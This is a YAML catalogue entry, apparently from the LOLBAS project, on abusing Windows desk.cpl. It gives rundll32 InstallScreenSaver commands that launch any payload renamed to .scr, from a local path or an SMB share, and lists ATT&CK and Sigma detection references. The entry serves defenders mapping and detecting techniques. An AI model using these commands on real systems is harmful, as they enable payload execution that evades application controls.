---
Name: Desk.cpl
Description: Desktop Settings Control Panel
Author: Hai Vaknin
Created: 2022-04-21
Commands:
  - Command: rundll32.exe desk.cpl,InstallScreenSaver C:\temp\file.scr
    Description: Launch an executable with a .scr extension by calling the InstallScreenSaver function.
    Usecase: Launch any executable payload, as long as it uses the .scr extension.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows 10, Windows 11
  - Command: rundll32.exe desk.cpl,InstallScreenSaver \\127.0.0.1\c$\temp\file.scr
    Description: Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.
    Usecase: Launch any executable payload, as long as it uses the .scr extension.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows 10, Windows 11    
Full_Path:
  - Path: C:\Windows\System32\desk.cpl
  - Path: C:\Windows\SysWOW64\desk.cpl
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/file_event_win_new_src_file.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml
Resources:
  - Link: https://vxug.fakedoma.in/zines/29a/29a7/Articles/29A-7.030.txt
  - Link: https://twitter.com/pabraeken/status/998627081360695297
  - Link: https://twitter.com/VakninHai/status/1517027824984547329
Acknowledgement:
  - Person: Rafael S Marques
    Handle: '@pegabizu'
  - Person: Pierre-Alexandre Braeken
    Handle: '@pabraeken'
  - Person: hai
    Handle: '@VakninHai'
  - Person: Christopher Peacock
    Handle: '@SecurePeacock'
---
